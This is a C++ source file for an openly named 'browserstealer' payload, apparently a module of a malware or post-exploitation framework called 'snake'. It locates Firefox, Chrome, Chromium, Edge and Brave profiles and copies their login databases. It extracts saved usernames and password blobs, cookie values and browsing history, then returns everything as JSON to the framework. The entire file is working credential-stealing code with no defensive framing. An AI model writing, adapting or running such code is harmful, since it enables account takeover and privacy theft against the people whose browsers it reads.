#include <dirent.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>

#include <sqlite3.h>

#include <algorithm>
#include <charconv>
#include <cmath>
#include <cstdlib>
#include <map>
#include <string>
#include <utility>
#include <vector>

#include "snake/crypto.hpp"
#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using json = nlohmann::json;

std::string user_home() {
    const char* h = getenv("HOME");
    return (h != nullptr) ? std::string(h) : std::string();
}

std::string join_path(const std::string& base, const std::string& sub) {
    if (base.empty()) return sub;
    if (base.back() == '/') return base + sub;
    return base + "/" + sub;
}

std::string sanitize_utf8(const std::string& in) {
    std::string out;
    out.reserve(in.size());
    size_t i = 0;
    while (i < in.size()) {
        unsigned char c = (unsigned char)in[i];
        size_t len = 0;
        if (c < 0x80) {
            len = 1;
        } else if ((c & 0xE0) == 0xC0 && c >= 0xC2) {
            len = 2;
        } else if ((c & 0xF0) == 0xE0) {
            len = 3;
        } else if ((c & 0xF8) == 0xF0 && c <= 0xF4) {
            len = 4;
        }
        bool ok = (len > 0) && (i + len <= in.size());
        for (size_t k = 1; ok && k < len; ++k) {
            if (((unsigned char)in[i + k] & 0xC0) != 0x80) ok = false;
        }
        if (ok && len == 2) {
            unsigned cp = ((unsigned)(c & 0x1F) << 6) | ((unsigned char)in[i + 1] & 0x3F);
            if (cp < 0x80) ok = false;
        }
        if (ok && len == 3) {
            unsigned cp = ((unsigned)(c & 0x0F) << 12) |
                          ((unsigned)((unsigned char)in[i + 1] & 0x3F) << 6) |
                          ((unsigned char)in[i + 2] & 0x3F);
            if (cp < 0x800 || (cp >= 0xD800 && cp <= 0xDFFF)) ok = false;
        }
        if (ok && len == 4) {
            unsigned cp = ((unsigned)(c & 0x07) << 18) |
                          ((unsigned)((unsigned char)in[i + 1] & 0x3F) << 12) |
                          ((unsigned)((unsigned char)in[i + 2] & 0x3F) << 6) |
                          ((unsigned char)in[i + 3] & 0x3F);
            if (cp < 0x10000 || cp > 0x10FFFF) ok = false;
        }
        if (!ok) {
            out += "\xEF\xBF\xBD";
            i += 1;
            continue;
        }
        out.append(in, i, len);
        i += len;
    }
    return out;
}

std::string go_float(double f) {
    if (std::isnan(f) || std::isinf(f)) return "null";
    double a = std::fabs(f);
    std::chars_format fmt = std::chars_format::fixed;
    if (a != 0.0 && (a < 1e-6 || a >= 1e21)) fmt = std::chars_format::scientific;
    char buf[64];
    auto res = std::to_chars(buf, buf + sizeof(buf), f, fmt);
    std::string s(buf, (size_t)(res.ptr - buf));
    if (fmt == std::chars_format::scientific) {
        size_t n = s.size();
        if (n >= 4 && s[n - 4] == 'e' && s[n - 3] == '-' && s[n - 2] == '0') {
            s[n - 2] = s[n - 1];
            s.pop_back();
        }
    }
    return s;
}

bool list_dirs(const std::string& path, std::vector<std::string>& out) {
    DIR* d = opendir(path.c_str());
    if (d == nullptr) return false;
    std::vector<std::string> names;
    struct dirent* e;
    while ((e = readdir(d)) != nullptr) {
        std::string n = e->d_name;
        if (n == "." || n == "..") continue;
        names.push_back(n);
    }
    closedir(d);
    std::sort(names.begin(), names.end());
    for (const auto& n : names) {
        struct stat st;
        if (::lstat((path + "/" + n).c_str(), &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) out.push_back(n);
    }
    return true;
}

struct SqlRows {
    std::vector<json> rows;
    bool ok = false;
};

SqlRows read_sqlite(const std::string& path, const std::string& table,
                    const std::vector<std::string>& columns) {
    SqlRows out;

    struct stat st;
    if (::stat(path.c_str(), &st) != 0 && errno == ENOENT) return out;

    std::string src;
    if (!read_file(path, src)) return out;

    const char* tmp_env = getenv("TMPDIR");
    std::string tmpdir = (tmp_env != nullptr && *tmp_env != '\0') ? std::string(tmp_env) : "/tmp";
    int fd = -1;
    std::string tmp_name;
    for (int attempt = 0; attempt < 16 && fd < 0; ++attempt) {
        tmp_name = tmpdir + "/browser-" + to_hex(random_bytes(8)) + ".db";
        fd = ::open(tmp_name.c_str(), O_WRONLY | O_CREAT | O_EXCL, 0600);
    }
    if (fd < 0) return out;

    bool wrote = true;
    size_t off = 0;
    while (off < src.size()) {
        ssize_t n = ::write(fd, src.data() + off, src.size() - off);
        if (n > 0) {
            off += (size_t)n;
            continue;
        }
        if (n < 0 && errno == EINTR) continue;
        wrote = false;
        break;
    }
    ::close(fd);
    if (!wrote) {
        ::remove(tmp_name.c_str());
        return out;
    }

    sqlite3* db = nullptr;
    if (sqlite3_open(tmp_name.c_str(), &db) != SQLITE_OK) {
        if (db != nullptr) sqlite3_close(db);
        ::remove(tmp_name.c_str());
        return out;
    }

    std::string colstr;
    for (size_t i = 0; i < columns.size(); ++i) {
        if (i > 0) colstr += ", ";
        colstr += columns[i];
    }
    std::string query = "SELECT " + colstr + " FROM " + table + " LIMIT 100";

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        ::remove(tmp_name.c_str());
        return out;
    }

    out.ok = true;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        json row = json::object();
        for (int i = 0; i < (int)columns.size(); ++i) {
            switch (sqlite3_column_type(stmt, i)) {
                case SQLITE_INTEGER:
                    row[columns[i]] = (long long)sqlite3_column_int64(stmt, i);
                    break;
                case SQLITE_FLOAT:
                    row[columns[i]] = json::parse(go_float(sqlite3_column_double(stmt, i)));
                    break;
                case SQLITE_BLOB: {
                    const void* p = sqlite3_column_blob(stmt, i);
                    int n = sqlite3_column_bytes(stmt, i);
                    Bytes b;
                    if (p != nullptr && n > 0)
                        b.assign((const uint8_t*)p, (const uint8_t*)p + (size_t)n);
                    row[columns[i]] = to_b64(b);
                    break;
                }
                case SQLITE_NULL:
                    row[columns[i]] = nullptr;
                    break;
                default: {
                    const unsigned char* p = sqlite3_column_text(stmt, i);
                    int n = sqlite3_column_bytes(stmt, i);
                    std::string s;
                    if (p != nullptr) s.assign((const char*)p, (size_t)n);
                    row[columns[i]] = sanitize_utf8(s);
                    break;
                }
            }
        }
        out.rows.push_back(row);
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    ::remove(tmp_name.c_str());
    return out;
}

void scan_firefox(std::map<std::string, std::vector<json>>& results) {
    std::string home = user_home();
    const std::string bases[] = {
        join_path(home, ".mozilla/firefox"),
        join_path(home, "snap/firefox/common/.mozilla/firefox"),
    };
    for (const std::string& base : bases) {
        std::vector<std::string> entries;
        if (!list_dirs(base, entries)) continue;
        for (const std::string& entry : entries) {
            std::string full = base + "/" + entry;
            json pd = json::object();
            pd["profile_name"] = entry;

            std::string data;
            if (read_file(full + "/logins.json", data)) {
                json raw = json::parse(data, nullptr, false);
                if (raw.is_object() && raw.contains("logins") && raw["logins"].is_array() &&
                    !raw["logins"].empty())
                    pd["logins"] = raw["logins"];
            }

            SqlRows cookies = read_sqlite(full + "/cookies.sqlite", "moz_cookies",
                                          {"host", "name", "value", "path", "expiry"});
            if (cookies.ok && !cookies.rows.empty()) pd["cookies"] = cookies.rows;

            SqlRows history = read_sqlite(full + "/places.sqlite", "moz_places",
                                          {"url", "title", "visit_count", "last_visit_date"});
            if (history.ok && !history.rows.empty()) pd["history"] = history.rows;

            results["firefox"].push_back(pd);
        }
    }
}

void scan_chrome_based(const std::string& name, std::map<std::string, std::vector<json>>& results) {
    std::string home = user_home();
    std::vector<std::string> bases;
    if (name == "chrome") {
        bases.push_back(join_path(home, ".config/google-chrome"));
        bases.push_back(join_path(home, ".config/chromium"));
    } else if (name == "edge") {
        bases.push_back(join_path(home, ".config/microsoft-edge"));
    } else if (name == "brave") {
        bases.push_back(join_path(home, ".config/BraveSoftware/Brave-Browser"));
    }
    for (const std::string& base : bases) {
        std::vector<std::string> entries;
        if (!list_dirs(base, entries)) continue;
        for (const std::string& entry : entries) {
            if (entry != "Default" && entry.find("Profile") == std::string::npos) continue;
            std::string profile = base + "/" + entry;
            json pd = json::object();
            pd["profile_name"] = entry;

            SqlRows logins =
                read_sqlite(profile + "/Login Data", "logins",
                            {"origin_url", "username_value", "password_value", "date_created"});
            if (logins.ok && !logins.rows.empty()) pd["logins"] = logins.rows;

            SqlRows cookies = read_sqlite(profile + "/Cookies", "cookies",
                                          {"host_key", "name", "value", "path", "expires_utc"});
            if (cookies.ok && !cookies.rows.empty()) pd["cookies"] = cookies.rows;

            SqlRows history = read_sqlite(profile + "/History", "urls",
                                          {"url", "title", "visit_count", "last_visit_time"});
            if (history.ok && !history.rows.empty()) pd["history"] = history.rows;

            results[name].push_back(pd);
        }
    }
}

class BrowserStealer : public Payload {
  public:
    const char* name() const override { return "browserstealer"; }
    const char* category() const override { return "credential"; }
    const char* description() const override {
        return "Extract saved browser credentials, cookies, and history from "
               "Chrome/Firefox/Edge/Brave";
    }

    Output execute(const Args&) const override {
        std::map<std::string, std::vector<json>> results;
        for (const char* n : {"firefox", "chrome", "edge", "brave"}) results[n] = {};
        scan_firefox(results);
        scan_chrome_based("chrome", results);
        scan_chrome_based("edge", results);
        scan_chrome_based("brave", results);

        int total_credentials = 0;
        int total_cookies = 0;
        json summary = json::object();
        json details = json::object();
        for (const char* n : {"firefox", "chrome", "edge", "brave"}) {
            const std::vector<json>& profiles = results[n];
            for (const auto& p : profiles) {
                if (p.contains("logins")) total_credentials += (int)p["logins"].size();
                if (p.contains("cookies")) total_cookies += (int)p["cookies"].size();
            }
            json bd = json::object();
            bd["profiles"] = profiles.empty() ? json(nullptr) : json(profiles);
            bd["credentials"] = nullptr;
            bd["cookies"] = nullptr;
            bd["history"] = nullptr;
            details[n] = bd;
            summary[std::string(n) + "_profiles"] = (int)profiles.size();
        }

        json out = json::object();
        out["timestamp"] = now_rfc3339();
        out["extraction_summary"] = summary;
        out["total_credentials"] = total_credentials;
        out["total_cookies"] = total_cookies;
        out["details"] = details;

        std::string s = MarshalJSON(out);
        return Output(s.begin(), s.end());
    }
};

BrowserStealer g_browserstealer;

struct Reg { Reg() { Register(&g_browserstealer); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
